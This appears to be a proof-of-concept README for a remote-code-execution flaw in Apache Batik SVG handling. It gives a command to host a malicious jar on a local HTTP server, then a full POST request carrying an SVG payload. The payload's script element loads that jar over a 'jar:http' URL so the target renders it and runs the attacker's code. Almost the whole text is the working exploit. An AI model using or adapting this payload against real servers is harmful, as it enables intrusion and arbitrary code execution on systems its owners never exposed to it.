## Generate the poc

[Please Read](../README.md)

## launch http server

```shell
cd target && python3 -m http.server 7777
```
## Exploit

```
POST /poc HTTP/1.1
Host: test.com:9999
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/xml
Content-Length: 312

<svg id="body" width="450" height="500" viewBox="0 0 450 500"
xmlns="http://www.w3.org/2000/svg" version="1.2"
xmlns:xlink="http://www.w3.org/1999/xlink" >
<script type="application/java-archive" xlink:href="jar:http://localhost:7777/ApacheBatik_SSRF_RCE_Poc-1.0-SNAPSHOT.jar!/"></script>
</svg>
```